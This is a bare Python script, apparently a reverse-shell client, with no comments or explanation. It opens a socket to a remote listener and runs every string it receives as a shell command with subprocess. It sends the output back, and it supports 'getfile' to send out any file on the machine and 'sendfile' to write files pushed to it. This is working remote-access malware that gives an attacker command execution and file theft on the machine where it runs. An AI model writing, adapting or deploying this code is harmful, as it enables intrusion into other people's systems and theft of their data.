import socket
import os
import subprocess

HOST = "0.0.0.0"
PORT = 5072
s = socket.socket()
s.connect((HOST, PORT))

connected = True
while connected:

    data = s.recv(1024)

    if data.decode("utf-8") == 'getfile':
        filename = s.recv(1024)
        f = open(filename, 'rb')
        i = f.read(1024)
        while(i):
            s.send(i)
            i = f.read(1024)
        f.close()
        s.send(str.encode("complete"))

    if data.decode("utf-8") == 'sendfile':
        filename = s.recv(1024)
        f = open(filename, 'wb')
        i = s.recv(1024)
        while not ("complete" in str(i)):
            f.write(i)
            i = s.recv(1024)
        f.close()
        print("Transfer Complete")
        continue

    if data[:8].decode("utf-8") == 'workdone':
        connected = False
        print("The connection has been terminated.")
        break

    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode(
            "utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        data1 = data.decode("utf-8")
        print(f"{currentWD}{data1}")
        print(output_str)
